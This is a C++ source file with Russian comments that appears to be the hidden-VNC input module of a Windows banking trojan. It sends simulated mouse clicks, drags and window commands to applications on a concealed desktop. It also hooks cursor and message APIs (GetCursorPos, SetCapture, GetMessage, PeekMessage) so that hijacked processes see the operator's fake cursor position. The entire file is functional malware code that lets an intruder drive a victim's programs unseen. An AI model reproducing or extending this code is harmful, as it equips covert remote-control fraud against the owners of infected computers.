#include <windows.h>
#include <ws2tcpip.h>
#include <wininet.h>

#include "..\defines.h"
#include "..\core.h"

#include "vncserver.h"
#include "defines.h"

#include "..\..\common\debug.h"
#include "..\..\common\gui.h"

#if(BO_VNC > 0)

/*
  Изменение захваченого окна.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN newTid             - новый TID.
  IN newWindow          - новое окно.
  IN newArea            - область захвата.
  IN post               - true - высылать WM_CAPTURECHANGED через PostMessage.
                          false - высылать WM_CAPTURECHANGED через SendMessage.
  
  Return                - предыдущите захваченое окно.
*/
static HWND changeMouseCapture(VNCPROCESSDATA *vncProcessData, DWORD newTid, HWND newWindow, WORD newArea, bool post)
{
  HWND oldWindow;

  CWA(kernel32, WaitForSingleObject)(vncProcessData->globalDataMutex, INFINITE);
  oldWindow = vncProcessData->globalData->mouseCapture.window;
  vncProcessData->globalData->mouseCapture.tid    = newTid;
  vncProcessData->globalData->mouseCapture.window = newWindow;
  vncProcessData->globalData->mouseCapture.area   = newArea;
  CWA(kernel32, ReleaseMutex)(vncProcessData->globalDataMutex);

  if(CWA(user32, IsWindow(oldWindow)) != FALSE)
  {
    if(post)CWA(user32, PostMessageW)(oldWindow, WM_CAPTURECHANGED, 0, (LPARAM)newWindow);
    else CWA(user32, SendMessageW)(oldWindow, WM_CAPTURECHANGED, 0, (LPARAM)newWindow);
  }
  return oldWindow;
}

/*
  Перемещение текущего захваченого окна.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN x                  - X.
  IN y                  - Y.
*/
static void moveCapturedWindow(VNCPROCESSDATA *vncProcessData, LONG x, LONG y)
{
  CWA(kernel32, WaitForSingleObject)(vncProcessData->globalDataMutex, INFINITE);
  HWND window = vncProcessData->globalData->mouseCapture.window;
  WORD area   = vncProcessData->globalData->mouseCapture.area;
  CWA(kernel32, ReleaseMutex)(vncProcessData->globalDataMutex);

  RECT rect;
  
  if(CWA(user32, GetWindowRect)(window, &rect) == FALSE)return;
  
  //Создаем потоциально новый RECT.
  if(area == HTCAPTION)
  {
    x -= vncProcessData->globalData->cursorPoint.x;
    y -= vncProcessData->globalData->cursorPoint.y;

    rect.left   += x;
    rect.top    += y;
    rect.right  += x;
    rect.bottom += y;
  }
  else
  {
    RECT newRect;

    newRect.left   = rect.left   + (x - rect.left);
    newRect.top    = rect.top    + (y - rect.top);
    newRect.right  = rect.right  + (x - rect.right);
    newRect.bottom = rect.bottom + (y - rect.bottom);

    //Выбираем изменяемый стороны.
    switch(area)
    {
      case HTLEFT:   rect.left   = newRect.left;   break;
      case HTTOP:    rect.top    = newRect.top;    break;
      case HTRIGHT:  rect.right  = newRect.right;  break;
      case HTBOTTOM: rect.bottom = newRect.bottom; break;

      case HTCAPTION:
      case HTTOPLEFT:     rect.top    = newRect.top;    rect.left  = newRect.left;  break;
      case HTTOPRIGHT:    rect.top    = newRect.top;    rect.right = newRect.right; break;
      case HTBOTTOMLEFT:  rect.bottom = newRect.bottom; rect.left  = newRect.left;  break;
      case HTGROWBOX:
      case HTBOTTOMRIGHT: rect.bottom = newRect.bottom; rect.right = newRect.right; break;
    }
  }

  //Изменяем.
  if(CWA(user32, IsRectEmpty)(&rect) == FALSE)
  {
    if(CWA(user32, GetWindowLongPtrW)(window, GWL_STYLE) & WS_CHILD)
    {
      CWA(user32, MapWindowPoints)(NULL, CWA(user32, GetParent)(window), (POINT *)&rect, sizeof(RECT) / sizeof(POINT));
    }
    
    CWA(user32, SetWindowPos)(window,
                              NULL,
                              rect.left,
                              rect.top,
                              rect.right - rect.left,
                              rect.bottom - rect.top,
                              SWP_ASYNCWINDOWPOS | SWP_DEFERERASE | SWP_NOCOPYBITS | SWP_NOOWNERZORDER | SWP_NOREDRAW | SWP_NOZORDER);
  }
}

/*
  Проверят сообщение на даблклик.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN window             - окно.
  IN message            - исходное сообщение.

  Return                - оригианльный message, или его даблклик.
*/
static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DWORD message)
{
  DWORD doubleClickMessage = 0;
  bool nc;
  
  //Выбираем сообщение довйного клика.
  switch(message)
  {
    case WM_LBUTTONDOWN:
      doubleClickMessage = WM_LBUTTONDBLCLK;
      nc = false;
      break;
    
    case WM_NCLBUTTONDOWN:
      doubleClickMessage = WM_NCLBUTTONDBLCLK;
      nc = true;
      break;
    
    case WM_MBUTTONDOWN:
      doubleClickMessage = WM_MBUTTONDBLCLK;
      nc = false;
      break;
    
    case WM_NCMBUTTONDOWN:
      doubleClickMessage = WM_NCMBUTTONDBLCLK;
      nc = true;
      break;
    
    case WM_RBUTTONDOWN:
      doubleClickMessage = WM_RBUTTONDBLCLK;
      nc = false;
      break;
    
    case WM_NCRBUTTONDOWN:
      doubleClickMessage = WM_NCRBUTTONDBLCLK;
      nc = true;
      break;
  }
  
  //Если возможен даблклик.
  if(doubleClickMessage != 0)
  {
    DWORD timeOfMessage = CWA(kernel32, GetTickCount)();

    //Тест на даблклик.
    if(vncProcessData->serverData.input.lastDownWindow == window && vncProcessData->serverData.input.lastDownMessage == message &&
        (timeOfMessage - vncProcessData->serverData.input.lastDownTime) <= MOUSE_DOUBLE_CLICK_DELAY &&
        (nc || CWA(user32, GetClassLongPtrW)(window, GCL_STYLE) & CS_DBLCLKS)
       )
    {
      vncProcessData->serverData.input.lastDownMessage = 0;
      vncProcessData->serverData.input.lastDownTime    = 0;
      vncProcessData->serverData.input.lastDownWindow  = NULL;

      return doubleClickMessage;
    }
    
    vncProcessData->serverData.input.lastDownMessage = message;
    vncProcessData->serverData.input.lastDownTime    = timeOfMessage;
    vncProcessData->serverData.input.lastDownWindow  = window;
  }
  return message;
}

/*
  Обработка события мыши.

  IN vncProcessData  - VNCPROCESSDATA.
  IN window          - окно.
  IN windowInfo      - данные об окне.
  IN hiTest          - результат WM_NCHITTEST.
  IN message         - сообщение для HTCLIENT.
  IN ncMessage       - сообщение не для HTCLIENT.
  IN clientCursorPos - клиентские координаты.
  IN screenCursorPos - экарнные координаты.
*/
static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOWINFO *windowInfo, WORD hitTest, DWORD message, DWORD ncMessage, LPARAM clientCursorPos, LPARAM screenCursorPos)
{
  //Активация окна.
  if(message == WM_LBUTTONDOWN || message == WM_MBUTTONDOWN || message == WM_RBUTTONDOWN)
  {
    bool skip = false;
    HWND topParent = CWA(user32, GetAncestor)(window, GA_ROOT);
    
    if(topParent != vncProcessData->serverData.input.lastTopLevelWindow)
    {
      WDEBUG1(WDDT_INFO, "New active window %p.", topParent);
      DWORD_PTR result;
      if(CWA(user32, SendMessageTimeoutW)(window, WM_MOUSEACTIVATE, (WPARAM)topParent, MAKELPARAM(hitTest, message), SMTO_ABORTIFHUNG | SMTO_NORMAL, SENDMESSAGE_TIMEOUT, &result) != 0 &&
         (result == MA_ACTIVATEANDEAT || result == MA_NOACTIVATEANDEAT))
      {
        skip = true;        
      }
      else
      {
        vncProcessData->serverData.input.lastTopLevelWindow = topParent;
      }
    }

    if(skip == true)return; //Не нужно отправлять сообщение нажатия.
  }
  
  CWA(user32, PostMessageW)(window, WM_SETCURSOR, (WPARAM)window, MAKELPARAM(hitTest, message));
  if(hitTest == HTCLIENT)
  {
    WORD state = updateInputState(vncProcessData, 0, false);
    CWA(user32, PostMessageW)(window, checkForDoubleClick(vncProcessData, window, message), state, clientCursorPos);
    return;
  }
  
  ncMessage = checkForDoubleClick(vncProcessData, window, ncMessage);
  
  //Некотрые сообшения мы обрабатываем самостоятельно.    
  WORD command = 0;
  switch(hitTest)
  {
    case HTSYSMENU:
      if(ncMessage == WM_NCLBUTTONDBLCLK)command = SC_CLOSE;
      else if(ncMessage == WM_NCRBUTTONUP || ncMessage == WM_NCLBUTTONDOWN)command = 0xFFFF;
      break;

    case HTMINBUTTON:
      if(ncMessage == WM_NCLBUTTONUP)
      {
        if(windowInfo->dwStyle & WS_MINIMIZEBOX)command = SC_MINIMIZE;
      }
      else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
      break;

    case HTMAXBUTTON:
      if(ncMessage == WM_NCLBUTTONUP)
      {
        if(windowInfo->dwStyle & WS_MAXIMIZEBOX)command = windowInfo->dwStyle & WS_MAXIMIZE ? SC_RESTORE : SC_MAXIMIZE;
      }
      else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
      break;

    case HTCLOSE:
      if(ncMessage == WM_NCLBUTTONUP)
      {
        //FIXME: Проверка доступности кнопки.
        command = SC_CLOSE;
      }
      else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
      break;

    case HTHELP:
      if(ncMessage == WM_NCLBUTTONUP)command = SC_CONTEXTHELP;
      else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
      break;
    
    case HTVSCROLL:
    case HTHSCROLL:
      if(ncMessage == WM_NCLBUTTONDOWN || ncMessage == WM_NCLBUTTONUP || ncMessage == WM_NCLBUTTONDBLCLK || ncMessage == WM_NCMOUSEMOVE)
      {
        if(ncMessage == WM_NCLBUTTONDOWN)
        {
          //Небольшой хак для скрола.
          changeMouseCapture(vncProcessData, CWA(user32, GetWindowThreadProcessId)(window, NULL), window, HTNOWHERE, true);
        }
        goto postMessage;
      }
      else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
      break;

    case HTMENU:
      if(ncMessage == WM_NCLBUTTONDOWN)
      {
        CWA(user32, PostMessageW)(window, vncProcessData->vncMessage, VMW_EXECUTE_MENU, 0);          
        break;
      }
      if(ncMessage == WM_NCMOUSEMOVE)
      {
        CWA(user32, PostMessageW)(window, vncProcessData->vncMessage, VMW_HILITE_MENU, 0);          
        break;
      }
      break;
    
    case HTCAPTION:
      if(ncMessage == WM_NCLBUTTONDBLCLK)goto postMessage;
      else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
      //break;

    //case HTGROWBOX:
    case HTLEFT:
    case HTRIGHT:
    case HTTOP:
    case HTTOPLEFT:
    case HTTOPRIGHT:
    case HTBOTTOM:
    case HTBOTTOMLEFT:
    case HTBOTTOMRIGHT:
      //Начинаем перетаскивание.
      if(ncMessage == WM_NCLBUTTONDOWN)// && (windowInfo->dwStyle & WS_CHILD) == 0)
      {
        changeMouseCapture(vncProcessData, CWA(user32, GetWindowThreadProcessId)(window, NULL), window, hitTest, true);
      }
      break;

    default:
    postMessage:
      CWA(user32, PostMessageW)(window, ncMessage, hitTest, screenCursorPos);
      break;
  }
  
  //Отправляем команду.
  if(command != 0)
  {
    if(command == 0xFFFF)CWA(user32, PostMessageW)(window, WM_CONTEXTMENU, (WPARAM)window, screenCursorPos); 
    else CWA(user32, PostMessageW)(window, WM_SYSCOMMAND, command, screenCursorPos); 
  }
}

void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, DWORD data)
{
  HWND captureWindow     = NULL;
  DWORD captureWindowTid = 0;
  WORD oldInputState;

  //Проверяем процесс перетаскивания окна.
  if(vncProcessData->globalData->mouseCapture.area != HTNOWHERE)
  {
    //Перетаксивание.
    if(flags & MOUSEEVENTF_MOVE)
    {
      moveCapturedWindow(vncProcessData, x, y);
      flags &= ~MOUSEEVENTF_MOVE;
    }
    //Перетаскивание окончено.
    if(flags & MOUSEEVENTF_LEFTUP)
    {
      changeMouseCapture(vncProcessData, 0, NULL, HTNOWHERE, true);
      //flags &= ~MOUSEEVENTF_LEFTUP;
    }
  }
  else
  {
    captureWindow    = vncProcessData->globalData->mouseCapture.window;
    captureWindowTid = vncProcessData->globalData->mouseCapture.tid;
    oldInputState    = captureWindow == NULL ? 0 : updateInputState(vncProcessData, 0, false);
  }

  vncProcessData->globalData->cursorPoint.x = x;
  vncProcessData->globalData->cursorPoint.y = y;

  //Нечего обрабатывать.
  if(flags == 0)return;

  //Обновляем состояния кнопок мыши.
  if(flags & MOUSEEVENTF_LEFTDOWN)updateInputState(vncProcessData, VK_LBUTTON, true);
  else if(flags & MOUSEEVENTF_LEFTUP)updateInputState(vncProcessData, VK_LBUTTON, false);

  if(flags & MOUSEEVENTF_MIDDLEDOWN)updateInputState(vncProcessData, VK_MBUTTON, true);
  else if(flags & MOUSEEVENTF_MIDDLEUP)updateInputState(vncProcessData, VK_MBUTTON, false);

  if(flags & MOUSEEVENTF_RIGHTDOWN)updateInputState(vncProcessData, VK_RBUTTON, true);
  else if(flags & MOUSEEVENTF_RIGHTUP)updateInputState(vncProcessData, VK_RBUTTON, false);
  
  //Вычисляем окно.
  DWORD hitTest;
  HWND window = Gui::_windowFromPoint(vncProcessData->globalData->cursorPoint, SENDMESSAGE_TIMEOUT, &hitTest);
  
  /*
    Если окно вернуло HITTEST изменния размера, а бордюра у окна нет,
    перененаправляем данные родителю.
  */
  if(hitTest >= HTSIZEFIRST && hitTest <= HTSIZELAST)
  {
    DWORD style = CWA(user32, GetWindowLongPtrW)(window, GWL_STYLE);
    if(style & WS_CHILD && !Gui::_styleHaveSizeBorders(style))
    {
      HWND parent = CWA(kernel32, GetParent)(window);
      if(parent != NULL)window = parent;
    }
  }
  
  //Обработка захваченого окна.  
  if(window != NULL && getWindowClassFlags(window) & WCF_MOUSE_AUTOCAPTURE)
  {
    if(window != captureWindow)
    {
      captureWindow    = window;
      captureWindowTid = CWA(user32, GetWindowThreadProcessId)(window, NULL);
      changeMouseCapture(vncProcessData, captureWindowTid, captureWindow, HTNOWHERE, true);
    }
    hitTest = HTCLIENT;
  }
  else if(captureWindow != NULL)
  {
    if(
       CWA(user32, IsWindow)(captureWindow) &&
       (
        window == NULL || captureWindow == window ||           //Если просиходит внутри окна.
        oldInputState & (VK_LBUTTON | VK_MBUTTON | VK_RBUTTON) //Если с предыдшего раза нажа хотябы одна кнопка, направляем сообщения в captureWindow.
       )
      )
    {
      window = captureWindow;
      hitTest = HTCLIENT;
    }
    //Снимаем захват для всех отальных случиях (это отличается от правил MS!).
    else if(flags != (MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE))
    {
      changeMouseCapture(vncProcessData, 0, NULL, HTNOWHERE, true);
    }
  }
  
  if(window != NULL)
  {
    WINDOWINFO windowInfo;
    windowInfo.cbSize = sizeof(WINDOWINFO);

    if(CWA(user32, GetWindowInfo)(window, &windowInfo) != FALSE)
    {
      LPARAM screenCursorPos = MAKELPARAM(x, y);
      LPARAM clientCursorPos;
            
      //Координаты нужны только для HTCLIENT.
      if(hitTest == HTCLIENT)
      {
        if(getWindowClassFlags(window) & WCF_MOUSE_CLIENT_TO_SCREEN)clientCursorPos = screenCursorPos;
        else clientCursorPos = MAKELPARAM(x - windowInfo.rcClient.left, y - windowInfo.rcClient.top);
      }

      //Левая кнопка.
      if(flags & MOUSEEVENTF_LEFTDOWN)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_LBUTTONDOWN, WM_NCLBUTTONDOWN, clientCursorPos, screenCursorPos);
      else if(flags & MOUSEEVENTF_LEFTUP)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_LBUTTONUP, WM_NCLBUTTONUP, clientCursorPos, screenCursorPos);

      //Средняя конопка.
      if(flags & MOUSEEVENTF_MIDDLEDOWN)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_MBUTTONDOWN, WM_NCMBUTTONDOWN, clientCursorPos, screenCursorPos);
      else if(flags & MOUSEEVENTF_MIDDLEUP)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_MBUTTONUP, WM_NCMBUTTONUP, clientCursorPos, screenCursorPos);

      //Правая кнопка.
      if(flags & MOUSEEVENTF_RIGHTDOWN)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_RBUTTONDOWN, WM_NCRBUTTONDOWN, clientCursorPos, screenCursorPos);
      else if(flags & MOUSEEVENTF_RIGHTUP)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_RBUTTONUP, WM_NCRBUTTONUP, clientCursorPos, screenCursorPos);

      //Перемешение.
      if(flags & MOUSEEVENTF_MOVE)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_MOUSEMOVE, WM_NCMOUSEMOVE, clientCursorPos, screenCursorPos);

      //Прокрутка.
      if(flags & MOUSEEVENTF_WHEEL)
      {
        WORD state = updateInputState(vncProcessData, 0, false);
        CWA(user32, PostMessageW)(window, WM_MOUSEWHEEL, MAKEWPARAM(state, data), screenCursorPos);
      }
    }
  }
}

DWORD WINAPI VncServer::hookerGetMessagePos(void)
{
  if(IS_VNC_PROCESS)
  {
    return (DWORD)MAKELONG(vncActiveProcessData.globalData->cursorPoint.x, vncActiveProcessData.globalData->cursorPoint.y);
  }

  return CWA(user32, GetMessagePos)();
}

BOOL WINAPI VncServer::hookerGetCursorPos(LPPOINT point)
{
  if(IS_VNC_PROCESS)
  {
    if(point != NULL)
    {
      point->x = vncActiveProcessData.globalData->cursorPoint.x;
      point->y = vncActiveProcessData.globalData->cursorPoint.y;
      return TRUE;
    }
    return FALSE;
  }

  return CWA(user32, GetCursorPos)(point);
}

BOOL WINAPI VncServer::hookerSetCursorPos(int x, int y)
{
  if(IS_VNC_PROCESS)
  {
    vncActiveProcessData.globalData->cursorPoint.x = x;
    vncActiveProcessData.globalData->cursorPoint.y = y;
    return TRUE;
  }
  
  return CWA(user32, SetCursorPos)(x, y);
}

HWND WINAPI VncServer::hookerSetCapture(HWND window)
{
  if(IS_VNC_PROCESS)
  {
    if(window == NULL)
    {
      return changeMouseCapture(&vncActiveProcessData, 0, NULL, HTNOWHERE, false);
    }
    else
    {
      DWORD tid = CWA(kernel32, GetCurrentThreadId)();
      if(tid == CWA(user32, GetWindowThreadProcessId)(window, NULL))return changeMouseCapture(&vncActiveProcessData, tid, window, HTNOWHERE, false);
      return NULL;
    }
  }

  return CWA(user32, SetCapture)(window);
}

BOOL WINAPI VncServer::hookerReleaseCapture(VOID)
{
  if(IS_VNC_PROCESS)
  {
    if(vncActiveProcessData.globalData->mouseCapture.tid == CWA(kernel32, GetCurrentThreadId)()) 
    {
      changeMouseCapture(&vncActiveProcessData, 0, NULL, HTNOWHERE, false);
      return TRUE;
    }

    CWA(kernel32, SetLastError)(ERROR_ACCESS_DENIED);
    return FALSE;
  }

  return CWA(user32, ReleaseCapture)();
}

HWND WINAPI VncServer::hookerGetCapture(void)
{
  if(IS_VNC_PROCESS)
  {
    if(vncActiveProcessData.globalData->mouseCapture.tid == CWA(kernel32, GetCurrentThreadId)())
    {
      HWND window = vncActiveProcessData.globalData->mouseCapture.window;
      if(window != NULL && CWA(user32, IsWindow)(window) == FALSE)changeMouseCapture(&vncActiveProcessData, 0, NULL, HTNOWHERE, false);
      else return window;      
    }
    return NULL;
  }

  return CWA(user32, GetCapture)();
}

/*
  Модификация MSG структуры.

  IN r       - возращаемое значение от функции, получившей структуру msg.
  IN OUT msg - MSG

*/
static void fixMessage(BOOL r, LPMSG msg)
{
  if(r != 0 && r != -1 && msg != NULL && IS_VNC_PROCESS)
  {
    msg->pt.x = vncActiveProcessData.globalData->cursorPoint.x;
    msg->pt.y = vncActiveProcessData.globalData->cursorPoint.y;
  }
}

BOOL WINAPI VncServer::hookerGetMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax)
{
  BOOL r = CWA(user32, GetMessageW)(msg, window, msgFilterMin, msgFilterMax);
  fixMessage(r, msg);
  return r;
}

BOOL WINAPI VncServer::hookerGetMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax)
{
  BOOL r = CWA(user32, GetMessageA)(msg, window, msgFilterMin, msgFilterMax);
  fixMessage(r, msg);
  return r;
}

BOOL WINAPI VncServer::hookerPeekMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg)
{
  BOOL r = CWA(user32, PeekMessageW)(msg, window, msgFilterMin, msgFilterMax, removeMsg);
  fixMessage(r, msg);
  return r;
}

BOOL WINAPI VncServer::hookerPeekMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg)
{
  BOOL r = CWA(user32, PeekMessageA)(msg, window, msgFilterMin, msgFilterMax, removeMsg);
  fixMessage(r, msg);
  return r;
}

#endif
